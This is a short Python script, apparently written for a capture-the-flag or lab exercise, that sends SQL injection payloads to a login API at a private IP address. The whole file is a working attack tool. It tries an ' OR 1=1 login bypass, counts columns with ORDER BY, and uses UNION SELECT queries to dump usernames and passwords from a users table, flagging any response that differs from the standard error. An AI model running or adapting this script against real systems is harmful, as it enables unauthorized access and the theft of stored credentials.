import requests

url = 'http://10.82.171.5/api/login'

qq = [
    # 1. Simple check (Login Bypass) - Try this first!
    "' OR 1=1 -- -",
    
    # 2. Check for number of columns (ORDER BY)
    "' ORDER BY 1 -- -",
    "' ORDER BY 2 -- -",
    "' ORDER BY 3 -- -",

    # 3. Your original payloads
    "1' UNION SELECT username, password FROM users -- -",
    "1' UNION SELECT 1, group_concat(password) FROM users -- -",
    "1' UNION SELECT NULL, sqlite_version() -- -",
]

for q in qq:
    myobj = {'username': q, 'password': '123456'}
    
    print(f"[*] Trying payload: {q}")
    
    try:
        # Added timeout=5. If server takes >5s, it stops waiting.
        x = requests.post(url, data=myobj, timeout=5)
        
        # Only print if we get something other than the standard error
        if "The username or password passed are not correct" not in x.text:
            print(f"    [+] SUCCESS/DIFFERENT RESPONSE: {x.text}")
        else:
            print("    [-] Failed (Standard Error)")
            
    except requests.exceptions.Timeout:
        print("    [!] Request timed out (Server is stuck or blocking us)")
    except requests.exceptions.ConnectionError:
        print("    [!] Connection Error (Check your VPN)")
    
    print("-" * 50)
